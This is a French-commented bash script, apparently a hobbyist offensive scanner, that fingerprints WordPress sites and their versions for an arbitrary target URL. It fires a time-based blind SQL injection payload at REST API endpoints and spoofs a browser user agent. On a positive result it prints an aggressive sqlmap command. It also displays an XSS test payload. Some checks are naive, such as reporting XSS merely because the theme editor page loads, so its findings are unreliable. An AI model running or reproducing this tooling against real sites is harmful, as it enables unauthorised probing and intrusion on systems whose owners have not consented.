#!/bin/bash
clear
set -euo pipefail
IFS=$'\n\t'

# Couleurs
PINK='\033[38;5;213m'
PEACH='\033[38;5;209m'
MINT='\033[38;5;121m'
LAVENDER='\033[38;5;183m'
STAR='\033[38;5;228m'
RESET='\033[0m'

center_file() {
	local file="$1"
	local color="$2"
	local term_width="${COLUMNS:-$(tput cols)}"

	if [[ ! -f "$file" ]]; then
		echo "Fichier non trouvé : $file"
		return 1
	fi

	while IFS= read -r line; do
		local text="$line"
		local text_length=${#text}
		local padding=$(( (term_width - text_length) / 2 ))

		if [ $padding -lt 0 ]; then
			padding=0
		fi

		printf "${color}%*s%s${RESET}\n" "$padding" '' "$text"
	done < "$file"
}

center_text() {
	local term_width="${COLUMNS:-$(tput cols)}"
	local text="$1"
	local color="$2"
	local text_length=${#text}
	local padding=$(( (term_width - text_length) / 2 ))

	if [ $padding -lt 0 ]; then
		padding=0
	fi

	printf "${color}%*s%s${RESET}\n" $padding '' "$text"
}

center_file ascii/cat.txt $LAVENDER
echo ''
center_text "Made with <3 by Sil3ntPurr" $PEACH
echo ''
center_file ascii/SHAWTY.txt $PINK
echo ''


# Variables globales
readonly NEKO_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
readonly TIMEOUT=10

# Variables modifiables
SENPAI_TARGET=""

# Fonctions de logging
log_info() {
	echo -e "${PINK}[INFO] $1${RESET}"
}

log_success() {
	echo -e "${MINT}[SUCCESS] $1${RESET}"
}

log_warning() {
	echo -e "${PEACH}[WARNING] $1${RESET}"
}

log_error() {
	echo -e "${LAVENDER}[ERROR] $1${RESET}"
	exit 1
}

# Vérification des prérequis
check_dependencies() {
	local deps=("curl" "grep" "sed" "awk")
	for dep in "${deps[@]}"; do
		if ! command -v "$dep" >/dev/null 2>&1; then
			log_error "$dep n'est pas installe !"
		fi
	done
}

# Validation et préparation de l'URL
prepare_url() {
	if [[ ! "$SENPAI_TARGET" =~ ^https?:// ]]; then
		SENPAI_TARGET="http://$SENPAI_TARGET"
	fi

	if ! curl -sI "$SENPAI_TARGET" >/dev/null; then
		log_error "Impossible de se connecter a $SENPAI_TARGET"
	fi
}

# Requêtes HTTP sécurisées
make_request() {
	local url="$1"
	curl -s -A "$NEKO_AGENT" --connect-timeout "$TIMEOUT" "$url" 2>/dev/null || {
		log_warning "Erreur lors de la requete vers $url"
			return 1
		}
	}

# Détection WordPress
detect_wordpress() {
	log_info "Recherche de WordPress..."

	local wp_indicators=(
	"wp-content"
	"wp-includes"
	"wp-json"
	"wp-admin"
	"wordpress"
	"wp-login.php"
)

local found=false
local response

	# Test de la page d'accueil
	response=$(make_request "$SENPAI_TARGET")
	for indicator in "${wp_indicators[@]}"; do
		if echo "$response" | grep -qi "$indicator"; then
			found=true
			break
		fi
	done

	# Test du fichier readme.html
	if [ "$found" = false ]; then
		response=$(make_request "$SENPAI_TARGET/readme.html")
		if echo "$response" | grep -qi "wordpress"; then
			found=true
		fi
	fi

	# Test du fichier wp-login.php
	if [ "$found" = false ]; then
		response=$(make_request "$SENPAI_TARGET/wp-login.php")
		if echo "$response" | grep -qi "wordpress"; then
			found=true
		fi
	fi

	if [ "$found" = false ]; then
		log_error "WordPress non detecte"
	fi

	# Détection de la version
	local version=""

	# Méthode 1: readme.html
	version=$(make_request "$SENPAI_TARGET/readme.html" | grep -i "version" | head -1 | grep -oP "[0-9]+\.[0-9]+")

	# Méthode 2: meta generator
	if [ -z "$version" ]; then
		version=$(echo "$response" | grep -i "meta name=\"generator\"" | grep -oP "content=\"WordPress [0-9]+\.[0-9]+" | grep -oP "[0-9]+\.[0-9]+")
	fi

	# Méthode 3: wp-includes/version.php
	if [ -z "$version" ]; then
		version=$(make_request "$SENPAI_TARGET/wp-includes/version.php" | grep -oP "\$wp_version = '[0-9]+\.[0-9]+'" | grep -oP "[0-9]+\.[0-9]+")
	fi

	if [ -n "$version" ]; then
		log_success "WordPress trouve! Version: $version"
	else
		log_success "WordPress trouve! (Version inconnue)"
	fi
}

# Test SQLi
test_sqli() {
	log_info "Test de SQLi..."

	local endpoints=("wp-json/wp/v2/posts" "wp-json/wp/v2/users")
	local vulnerable=false

	for endpoint in "${endpoints[@]}"; do
		local url="$SENPAI_TARGET/$endpoint?per_page=1%20AND%20(SELECT%209999%20FROM%20(SELECT(SLEEP(5)))a)"
		local start_time=$(date +%s)

		make_request "$url" >/dev/null
		local end_time=$(date +%s)

		if [ $((end_time - start_time)) -ge 5 ]; then
			log_success "SQLi vulnerable detecte!"
			log_info "Commande sqlmap recommandee:"
			echo "sqlmap -u \"$SENPAI_TARGET/$endpoint?per_page=1*\" --batch --risk=3 --level=5"
			vulnerable=true
			break
		fi
	done

	if [ "$vulnerable" = false ]; then
		log_warning "Aucune vulnerabilite SQLi detectee"
	fi
}

# Test XSS
test_xss() {
	log_info "Test de XSS..."

	local theme_editor="$SENPAI_TARGET/wp-admin/theme-editor.php"
	local response

	response=$(make_request "$theme_editor")

	if echo "$response" | grep -q "Theme Editor"; then
		log_success "XSS potentiel detecte!"
		log_info "Payload de test: <script>alert('XSS')</script>"
	else
		log_warning "Aucune vulnerabilite XSS detectee"
	fi
}

# Fonction principale
main() {
	if [ $# -lt 1 ]; then
		log_error "Usage: $0 <URL>"
	fi

	SENPAI_TARGET="$1"

	check_dependencies
	prepare_url

	detect_wordpress
	echo ""
	test_sqli
	echo ""
	test_xss
	echo ""

	log_success "Tous les tests sont termines!"
}

main "$@"
